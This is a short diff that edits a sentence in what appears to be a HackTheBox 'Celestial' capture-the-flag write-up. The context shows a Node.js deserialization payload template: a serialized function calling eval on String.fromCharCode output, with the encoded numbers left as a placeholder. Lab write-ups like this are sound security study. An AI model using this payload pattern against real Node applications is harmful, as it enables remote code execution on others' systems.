@@ -89,7 +89,7 @@ After downloading the script, i generated my payload with:
 
 ![gen-payload-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/gen-payload-12.png)
 
-This results in a rather large output. I took the `<nums>` output and wrapped it inside a serliazed function and i invoked it at the end with `()`:
+This results in a rather large output. I took the `<nums>` output and wrapped it inside a serliazed function, invoking it at the end with `()`:
 
 ```javascript
 "_$$ND_FUNC$$_function (){eval(String.fromCharCode(<nums>))}()"
